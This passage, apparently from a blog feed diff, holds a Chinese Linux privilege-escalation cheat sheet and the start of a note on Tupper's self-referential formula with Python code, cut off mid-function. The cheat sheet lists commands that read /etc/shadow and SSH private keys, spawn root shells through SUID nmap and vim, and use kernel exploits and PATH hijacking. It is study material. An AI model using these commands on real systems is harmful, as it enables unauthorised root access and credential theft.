+<li>调整 ——
+利用现有的信息，调整漏洞利用代码（不同的操作系统可能有不同的利用）</li>
+<li>尝试 —— 通过大量的尝试来寻找正确答案</li>
+</ul>
+<h1 id="信息收集">信息收集</h1>
+<h2 id="操作系统">操作系统</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uname -a    				<span class="comment"># 打印所有可用的系统信息</span></span><br><span class="line">uname -r    				<span class="comment"># 内核版本</span></span><br><span class="line">uname -n    				<span class="comment"># 系统主机名。</span></span><br><span class="line">uname -m    				<span class="comment"># 查看系统内核架构（64位/32位）</span></span><br><span class="line">uname -mrs    				<span class="comment"># 查看系统内核架构（64位/32位）</span></span><br><span class="line">hostname    				<span class="comment"># 系统主机名</span></span><br><span class="line">cat /proc/version    		<span class="comment"># 内核信息</span></span><br><span class="line">cat /etc/*-release   		<span class="comment"># 分发信息</span></span><br><span class="line">cat /etc/issue       		<span class="comment"># 分发信息</span></span><br><span class="line">cat /proc/cpuinfo    		<span class="comment"># CPU信息</span></span><br><span class="line">cat /etc/lsb-release		<span class="comment"># Debian based</span></span><br><span class="line">cat /etc/redhat-release		<span class="comment"># Redhat based</span></span><br><span class="line">ls /boot | grep vmlinuz-	<span class="comment"># 内核版本</span></span><br></pre></td></tr></table></figure>
+<h2 id="环境变量">环境变量</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">env        					<span class="comment"># 显示环境变量</span></span><br><span class="line"><span class="built_in">set</span>        					<span class="comment"># 现实环境变量</span></span><br><span class="line"><span class="built_in">echo</span> %PATH 					<span class="comment"># 路径信息</span></span><br><span class="line"><span class="built_in">history</span>    					<span class="comment"># 显示当前用户的历史命令记录</span></span><br><span class="line"><span class="built_in">pwd</span>        					<span class="comment"># 输出工作目录</span></span><br><span class="line">cat /etc/profile   			<span class="comment"># 显示默认系统变量</span></span><br><span class="line">cat /etc/shells    			<span class="comment"># 显示可用的shellrc</span></span><br><span class="line">cat /etc/bashrc</span><br><span class="line">cat ~/.bash_profile</span><br><span class="line">cat ~/.bashrc</span><br><span class="line">cat ~/.bash_logout</span><br></pre></td></tr></table></figure>
+<h2 id="打印机服务">打印机服务</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lpstat -a</span><br></pre></td></tr></table></figure>
+<h2 id="用户和群组">用户和群组</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd     		<span class="comment"># 列出系统上的所有用户</span></span><br><span class="line">cat /var/mail/root</span><br><span class="line">cat /var/spool/mail/root</span><br><span class="line">cat /etc/group      		<span class="comment"># 列出系统上的所有组</span></span><br><span class="line">grep -v -E <span class="string">&quot;^#&quot;</span> /etc/passwd | awk -F: <span class="string">&#x27;$3 == 0 &#123; print $1&#125;&#x27;</span>      <span class="comment"># 列出所有的超级用户账户</span></span><br><span class="line">whoami              		<span class="comment"># 查看当前用户</span></span><br><span class="line">w                   		<span class="comment"># 谁目前已登录，他们正在做什么</span></span><br><span class="line">last                		<span class="comment"># 最后登录用户的列表</span></span><br><span class="line">lastlog             		<span class="comment"># 所有用户上次登录的信息</span></span><br><span class="line">lastlog –u %username%  		<span class="comment"># 有关指定用户上次登录的信息</span></span><br><span class="line">lastlog |grep -v <span class="string">&quot;Never&quot;</span>  	<span class="comment"># 以前登录用户的完整信息</span></span><br></pre></td></tr></table></figure>
+<h2 id="用户权限信息">用户权限信息</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">whoami        当前用户名</span><br><span class="line">id            当前用户信息</span><br><span class="line">cat /etc/sudoers  谁被允许以root身份执行</span><br><span class="line">sudo -l       当前用户可以以root身份执行操作</span><br></pre></td></tr></table></figure>
+<h2 id="进程和服务">进程和服务</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line">cat /etc/services</span><br></pre></td></tr></table></figure>
+<p>查看以 root 运行的进程</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br></pre></td></tr></table></figure>
+<h2 id="查看安装的软件">查看安装的软件</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -alh /usr/bin/</span><br><span class="line">ls -alh /sbin/</span><br><span class="line">ls -alh /var/cache/yum/</span><br><span class="line">dpkg -l</span><br></pre></td></tr></table></figure>
+<h2 id="服务插件">服务/插件</h2>
+<p>检查有没有不安全的服务配置，和一些有漏洞的插件。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/syslog.conf</span><br><span class="line">cat /etc/chttp.conf</span><br><span class="line">cat /etc/lighttpd.conf</span><br><span class="line">cat /etc/cups/cupsd.conf</span><br><span class="line">cat /etc/inetd.conf</span><br><span class="line">cat /etc/apache2/apache2.conf</span><br><span class="line">cat /etc/my.conf</span><br><span class="line">cat /etc/httpd/conf/httpd.conf</span><br><span class="line">cat /opt/lampp/etc/httpd.conf</span><br><span class="line">ls -aRl /etc/ | awk <span class="string">&#x27;$1 ~ /^.*r.*/</span></span><br></pre></td></tr></table></figure>
+<h2 id="计划任务">计划任务</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+<h2 id="有无明文存放用户密码">有无明文存放用户密码</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 <span class="string">&quot;password&quot;</span> [filename]</span><br><span class="line">find , -name <span class="string">&quot;*.php&quot;</span> -print0 | xargs -0 grep -i -n <span class="string">&quot;var <span class="variable">$password</span>&quot;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>比如说可能使用邮件明文传输密码；</p>
+<p>又或者说 MySQL 中明文存放用户密码。</p>
+</blockquote>
+<h2 id="有无-ssh-私钥">有无 ssh 私钥</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line">cat ~/.ssh/identity.pub</span><br><span class="line">cat ~/.ssh/identity</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">cat ~/.ssh/id_rsa</span><br><span class="line">cat ~/.ssh/id_dsa.pub</span><br><span class="line">cat ~/.ssh/id_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br></pre></td></tr></table></figure>
+<h2 id="查看与当前机器通信的其他用户或者主机">查看与当前机器通信的其他用户或者主机</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -i</span><br><span class="line">lsof -i :80</span><br><span class="line">grep 80 /etc/services</span><br><span class="line">netstat -antup</span><br><span class="line">netstat -antpx</span><br><span class="line">netstat -tulpn</span><br><span class="line">chkconfig --list</span><br><span class="line">chkconfig --list | grep 3:on</span><br><span class="line">last</span><br><span class="line">w</span><br></pre></td></tr></table></figure>
+<h2 id="日志文件">日志文件</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /var/<span class="built_in">log</span>/boot.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/cron</span><br><span class="line">cat /var/<span class="built_in">log</span>/syslog</span><br><span class="line">cat /var/<span class="built_in">log</span>/wtmp</span><br><span class="line">cat /var/run/utmp</span><br><span class="line">cat /etc/httpd/logs/access_log</span><br><span class="line">cat /etc/httpd/logs/access.log</span><br><span class="line">cat /etc/httpd/logs/error_log</span><br><span class="line">cat /etc/httpd/logs/error.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/apache2/access_log</span><br><span class="line">cat /var/<span class="built_in">log</span>/apache2/access.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/apache2/error_log</span><br><span class="line">cat /var/<span class="built_in">log</span>/apache2/error.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/apache/access_log</span><br><span class="line">cat /var/<span class="built_in">log</span>/apache/access.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/auth.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/chttp.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/cups/error_log</span><br><span class="line">cat /var/<span class="built_in">log</span>/dpkg.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/faillog</span><br><span class="line">cat /var/<span class="built_in">log</span>/httpd/access_log</span><br><span class="line">cat /var/<span class="built_in">log</span>/httpd/access.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/httpd/error_log</span><br><span class="line">cat /var/<span class="built_in">log</span>/httpd/error.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/lastlog</span><br><span class="line">cat /var/<span class="built_in">log</span>/lighttpd/access.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/lighttpd/error.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/lighttpd/lighttpd.access.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/lighttpd/lighttpd.error.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/messages</span><br><span class="line">cat /var/<span class="built_in">log</span>/secure</span><br><span class="line">cat /var/<span class="built_in">log</span>/syslog</span><br><span class="line">cat /var/<span class="built_in">log</span>/wtmp</span><br><span class="line">cat /var/<span class="built_in">log</span>/xferlog</span><br><span class="line">cat /var/<span class="built_in">log</span>/yum.log</span><br><span class="line">cat /var/run/utmp</span><br><span class="line">cat /var/webmin/miniserv.log</span><br><span class="line">cat /var/www/logs/access_log</span><br><span class="line">cat /var/www/logs/access.log</span><br><span class="line">ls -alh /var/lib/dhcp3/</span><br><span class="line">ls -alh /var/<span class="built_in">log</span>/postgresql/</span><br><span class="line">ls -alh /var/<span class="built_in">log</span>/proftpd/</span><br><span class="line">ls -alh /var/<span class="built_in">log</span>/samba/</span><br><span class="line"></span><br><span class="line">Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</span><br></pre></td></tr></table></figure>
+<h2 id="敏感文件">敏感文件</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/shadow</span><br><span class="line">ls -alh /var/mail/</span><br><span class="line">ls -ahlR /root/</span><br><span class="line">ls -ahlR /home/</span><br></pre></td></tr></table></figure>
+<h2 id="特殊的数据库配置文件">特殊的数据库、配置文件</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /var/apache2/config.inc</span><br><span class="line">cat /var/lib/mysql/mysql/user.MYD</span><br><span class="line">cat /root/anaconda-ks.cfg</span><br></pre></td></tr></table></figure>
+<h2 id="交互式shell">交互式shell</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">/bin/sh -i</span><br></pre></td></tr></table></figure>
+<h2 id="查看安装过的工具">查看安装过的工具</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name perl*</span><br><span class="line">find / -name python*</span><br><span class="line">find / -name gcc*</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h2 id="通讯与网络">通讯与网络</h2>
+<h4 id="系统有哪些-nic它是否连接到另一个网络">系统有哪些
+NIC？<em>它是否连接到另一个网络？</em></h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network </span><br></pre></td></tr></table></figure>
+<h4 id="网络配置设置是什么你能从这个网络中找到什么dhcp服务器域名服务器网关">网络配置设置是什么？<em>你能从这个网络中找到什么？DHCP服务器？域名服务器？网关？</em></h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname </span><br></pre></td></tr></table></figure>
+<h4 id="还有哪些其他用户和主机正在与系统通信">还有哪些其他用户和主机正在与系统通信？</h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w </span><br></pre></td></tr></table></figure>
+<h4 id="缓存了什么ip-和或-mac-地址">缓存了什么？<em>IP 和/或 MAC
+地址</em></h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp -e route /sbin/route -nee </span><br></pre></td></tr></table></figure>
+<h4 id="数据包嗅探可能吗能看到什么">数据包嗅探可能吗？能看到什么？</h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21</span><br></pre></td></tr></table></figure>
+<h3 id="可提权suid-guid">可提权SUID &amp;&amp; GUID</h3>
+<blockquote>
+<p>参考资料https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -1000 -<span class="built_in">type</span> d 2&gt;/dev/null   <span class="comment"># Sticky bit</span></span><br><span class="line">find / -perm -g=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SGID (chmod 2000)</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SUID (chmod 4000)</span></span><br><span class="line"></span><br><span class="line">find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SGID or SUID</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `locate -r <span class="string">&quot;bin$&quot;</span>`; <span class="keyword">do</span> find <span class="variable">$i</span> \( -perm -4000 -o -perm -2000 \) -<span class="built_in">type</span> f 2&gt;/dev/null; <span class="keyword">done</span>    <span class="comment"># 查找 /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者是 *bin 是否存在 SGID or SUID （快速搜查方式）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 root (/) 开始查找是否存在 SGID or SUID, not Symbolic links, 文件夹深度为 3(可以更改), 并列出错误信息 (例如 permission denied)</span></span><br><span class="line">find / -perm -g=s -o -perm -4000 ! -<span class="built_in">type</span> l -maxdepth 3 -<span class="built_in">exec</span> ls -ld &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<h3 id="查看可写执行目录">查看可写/执行目录</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null      # world-writeable folders</span><br><span class="line">find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders</span><br><span class="line">find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders</span><br><span class="line"></span><br><span class="line">find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders</span><br><span class="line"></span><br><span class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</span><br></pre></td></tr></table></figure>
+<h1 id="提权">提权</h1>
+<h2 id="suid-提权">SUID 提权</h2>
+<p>SUID 全称是 <strong>S</strong>et owner <strong>U</strong>ser
+<strong>ID</strong> up on execution。这是 Linux
+给可执行文件的一个属性。通俗的理解为其他用户执行这个程序的时候可以用该程序所有者/组的权限。需要注意的是，只有程序的所有者是
+0 号或其他 super user，同时拥有 SUID 权限，才可以提权。</p>
+<p>常见的可用来提权的Linux 可执行文件有：</p>
+<p>nmap, vim, find, bash, more, less, nano, cp</p>
+<p>查看可以 suid 提权的可执行文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<h3 id="nmap">nmap</h3>
+<p>早期nmap 具有交互模式，version
+2.02～5.21（5.2.0）。这里我用metasploitable2 来演示</p>
+<p><code>namp -V</code> 查看 nmap 版本信息</p>
+<p><code>nmap --interactive</code> 可以进入交互模式。</p>
+<p>进入交互模式后即可随意使用各种需要 root 权限的命令。</p>
+<p>5.2.0 之后，nmap 还可以通过执行脚本来提权。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> nse 脚本，shell.nse</span></span><br><span class="line">os.execute(&#x27;/bin/sh&#x27;)</span><br><span class="line"><span class="meta">#</span><span class="bash"> nmap 提权</span></span><br><span class="line">nmap --script=shell.nse </span><br><span class="line"><span class="meta">#</span><span class="bash"> 在某些发行版的Linux 可能会提权失败。</span></span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; getshell</span><br><span class="line">sudo nmap --script=getshell</span><br></pre></td></tr></table></figure>
+<h3 id="vim">vim</h3>
+<p>如果vim
+是通过SUID运行，就会继承root用户的权限。可读取只有root能读取的文件。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/shadow</span><br></pre></td></tr></table></figure>
+<p>vim 运行shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+<p>同理，满足条件的 less 和 more 都可。</p>
+<h3 id="date">date</h3>
+<p>它从文件中读取数据，它可用于进行特权读取或在受限文件系统之外公开文件。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LFILE=file_to_read</span><br><span class="line">date -f <span class="variable">$LFILE</span></span><br></pre></td></tr></table></figure>
+<h2 id="利用内核漏洞">利用内核漏洞</h2>
+<p>比如说对于 Ubuntu 16.04 可以直接查找漏洞的 exp 代码。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure>
+<p>将 exp 下载下来，解压，编译，运行，即可 get <code>root</code>
+权限。</p>
+<p>还有大名鼎鼎的CVE-2016-5195，脏牛漏洞。（Linux kernel &gt;=2.6.22
+并且Android也受影响</p>
+<ul>
+<li>https://github.com/timwr/CVE-2016-5195</li>
+<li>https://github.com/gbonacini/CVE-2016-5195</li>
+<li>复现参考：https://www.jianshu.com/p/df72d1ee1e3e</li>
+</ul>
+<p>其他内核漏洞：</p>
+<p>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) –
+'overlayfs' Local Root Shell</p>
+<p>https://www.exploit-db.com/exploits/37292/</p>
+<p>Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) – ‘overlayfs’ Local Root
+Exploit</p>
+<p>https://www.exploit-db.com/exploits/39166/</p>
+<p>Linux Kernel 4.3.3 – 'overlayfs' Local Privilege Escalation</p>
+<p>https://www.exploit-db.com/exploits/39230/</p>
+<blockquote>
+<p>提示：内核exploit提权有风险，有可能会崩溃系统。</p>
+</blockquote>
+<h2 id="利用root无密码执行">利用root无密码执行</h2>
+<p>简单来说，就是一个脚本，比如 py,sh 等或者是一个命令。这个文件可以以
+root
+身份运行，若在无密码的情况下执行的话，我们可以通过修改脚本内容/或者直接执行这个命令，利用命令来进行一些操作，来进行提权。</p>
+<p>比如常见的：</p>
+<ul>
+<li>写入一个 root 身份权限的用户进入 <code>/etc/passwd</code>
+文件中</li>
+</ul>
+<h2 id="利用环境变量提权">利用环境变量提权</h2>
+<p><code>PATH</code> 是 Linux 和 Unix
+操作系统中的环境变量，它指定存储可执行程序的所有 bin 和 sbin
+目录。当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件。超级用户通常还具有
+<code>/sbin</code> 和 <code>/usr/sbin</code>
+条目，以便于系统管理命令的执行。</p>
+<p>使用echo命令显示当前PATH环境变量：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+<p>如果你在PATH变量中看到<code>.</code>，则意味着登录用户可以从当前目录执行二进制文件/脚本</p>
+<p>我们先编译一个可执行文件shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">  setuid(0);</span><br><span class="line">  setgid(0);</span><br><span class="line">  system(&quot;cat /etc/passwd&quot;);</span><br><span class="line">&#125;</span><br><span class="line">// aaa.c</span><br></pre></td></tr></table></figure>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164152-e392c15c-b2d1-1.png"><img src="/linux-privilege-escalation-note/20200620164152-e392c15c-b2d1-1.png"></a></p>
+<p>在给该文件赋予权限。</p>
+<p>然后查看它的权限可以发现是有<code>s</code> 位，即suid。</p>
+<p>现在我们在目标机器上用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>
+来查看可以suid提权的文件，发现之前编译的shell可执行文件在里面。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164258-0afb894a-b2d2-1.png"><img src="/linux-privilege-escalation-note/20200620164258-0afb894a-b2d2-1.png"></a></p>
+<p>更多的操作可以参考：https://xz.aliyun.com/t/2767</p>
+<h2 id="利用存在漏洞的命令">利用存在漏洞的命令</h2>
+<p>不可否认的是命令很多，我们不可能熟悉每一种命令的漏洞。不过我们每次遇到了都可以用<code>searchsploit</code>
+来寻找可利用的 exp。</p>
+<p>或者还可以使用 <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>
+来查找漏洞。</p>
+<h2 id="更多">更多</h2>
+<p>更多相关的可以查看 <a href="https://xz.aliyun.com/t/7924">https://xz.aliyun.com/t/7924</a></p>
+]]></content>
+      <tags>
+        <tag>note</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>tupper公式（塔珀自指公式）</title>
+    <url>//tupper-note.html</url>
+    <content><![CDATA[<h1 id="简述">简述</h1>
+<p>Tupper 的自引用公式是由 Jeff Tupper
+定义的公式，当在平面中非常特定的位置以二维图形绘制时，可以直观地再现公式本身。</p>
+<blockquote>
+<p>实际上，它再现了所有可能的 106 像素宽和 17 像素高的图像。</p>
+</blockquote>
+<p>该公式是由以下定义的不等式：</p>
+<p><span class="math display">\[
+\frac{1}{2}&lt;\left\lfloor\mathrm{mod}\left(\left\lfloor\frac{y}{17}\right\rfloor
+2^{-17\lfloor x\rfloor-\mathrm{mod}(\lfloor
+y\rfloor,17))},2\right)\right\rfloor
+\]</span> 对于不同的 <span class="math inline">\(k\)</span>
+值，可以求得不同的图像，而当 <span class="math inline">\(k\)</span>
+为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4858450636189713423582095962494202044581400587983244549483093085061934704708809928450644769865524364849997247024915119110411605739177407856919754326571855442057210445735883681829823754139634338225199452191651284348332905131193199953502413758765239264874613394906870130562295813219481113685339535565290850023875092856892694555974281546386510730049106723058933586052544096664351265349363643957125565695936815184334857605266940161251266951421550539554519153785457525756590740540157929001765967965480064427829131488548259914721248506352686630476300</span><br></pre></td></tr></table></figure>
+<p>将得到与自身表达式完全一样的图像，故被称作自引用（自指）公式。</p>
+<figure>
+<img src="/tupper-note/自指公式图像.png" alt="自指公式图像">
+<figcaption aria-hidden="true">自指公式图像</figcaption>
+</figure>
+<p>可以使用在线网站绘制图像：<a href="https://tuppers-formula.ovh/">https://tuppers-formula.ovh/</a></p>
+<h1 id="python实现">Python实现</h1>
+<p>与原公式不相同，做了一些修正</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Literal</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tupper_self_referential_formula</span>(<span class="params">k: <span class="built_in">int</span>, width: <span class="built_in">int</span> = <span class="number">17</span>, height: <span class="built_in">int</span> = <span class="number">106</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Tupper self referential formula函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        k - 用于迭代图像的k值</span></span><br><span class="line"><span class="string">        width - 图像的宽</span></span><br><span class="line"><span class="string">        height - 图像的高</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        类型是numpy.ndarray矩阵，里面只有0和1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">    rst = np.zeros((width, height))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        y += k</span><br><span class="line">        a1 = <span class="number">2</span> ** (width * x + y % width)</span><br><span class="line">        a2 = (y // width) // a1</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> (a2 &amp; <span class="number">1</span>) == <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            rst[y, x] = f(x, y)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> rst[:, ::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tupper_to_str</span>(<span class="params">k: <span class="built_in">int</span>, width: <span class="built_in">int</span> = <span class="number">17</span>, height: <span class="built_in">int</span> = <span class="number">106</span>, show_black: <span class="built_in">str</span> = <span class="string">&quot;■&quot;</span>, show_white: <span class="built_in">str</span> = <span class="string">&quot;□&quot;</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成Tupper self referential formula函数的字符画</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        k - 用于迭代图像的k值</span></span><br><span class="line"><span class="string">        width - 图像的宽</span></span><br><span class="line"><span class="string">        height - 图像的高</span></span><br><span class="line"><span class="string">        show_black - 字符画中的黑色方块</span></span><br><span class="line"><span class="string">        show_white - 字符画中的白色方块</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        字符画字符串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mat = tupper_self_referential_formula(k, width, height)</span><br><span class="line">    rst = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            <span class="keyword">if</span> mat[y, x] == <span class="number">1</span>:</span><br><span class="line">                rst += show_black</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rst += show_white</span><br><span class="line">        rst += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tupper_to_img</span>(<span class="params">k: <span class="built_in">int</span>, width: <span class="built_in">int</span> = <span class="number">17</span>, height: <span class="built_in">int</span> = <span class="number">106</span>, filename: <span class="built_in">str</span> = <span class="string">&#x27;tupper.png&#x27;</span>, origin: <span class="type">Literal</span>[<span class="string">&#x27;upper&#x27;</span>, <span class="string">&#x27;lower&#x27;</span>] = <span class="string">&#x27;upper&#x27;</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成Tupper self referential formula函数的字符画</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        k - 用于迭代图像的k值</span></span><br><span class="line"><span class="string">        width - 图像的宽</span></span><br><span class="line"><span class="string">        height - 图像的高</span></span><br><span class="line"><span class="string">        filename - 输出图像的文件名</span></span><br><span class="line"><span class="string">        origin - 输出图像的方式(upper或者lower)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        类型是numpy.ndarray矩阵，里面只有0和1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">    rst = 